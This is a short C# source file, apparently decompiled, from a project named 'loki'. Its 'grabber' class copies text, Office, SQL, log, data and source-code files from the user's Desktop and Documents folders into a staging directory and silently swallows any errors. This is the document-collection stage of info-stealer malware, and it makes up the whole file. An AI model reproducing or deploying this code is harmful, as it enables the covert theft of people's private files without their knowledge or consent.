using System;
using System.IO;

namespace loki.loki.Utilies;

internal class grabber
{
	public static void grab_desktop(string dir)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".cs") || !(fileInfo.Extension != ".cpp") || !(fileInfo.Extension != ".dat") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log") || !(fileInfo.Extension != ".sql"))
				{
					Directory.CreateDirectory(dir + "\\Files\\");
					fileInfo.CopyTo(dir + "\\Files\\" + fileInfo.Name);
				}
			}
			FileInfo[] files2 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Personal)).GetFiles();
			foreach (FileInfo fileInfo2 in files2)
			{
				if (!(fileInfo2.Extension != ".txt") || !(fileInfo2.Extension != ".doc") || !(fileInfo2.Extension != ".cs") || !(fileInfo2.Extension != ".cpp") || !(fileInfo2.Extension != ".dat") || !(fileInfo2.Extension != ".docx") || !(fileInfo2.Extension != ".log") || !(fileInfo2.Extension != ".sql"))
				{
					if (!Directory.Exists(dir + "\\files"))
					{
						Directory.CreateDirectory(dir + "\\Files\\");
					}
					fileInfo2.CopyTo(dir + "\\Files\\" + fileInfo2.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
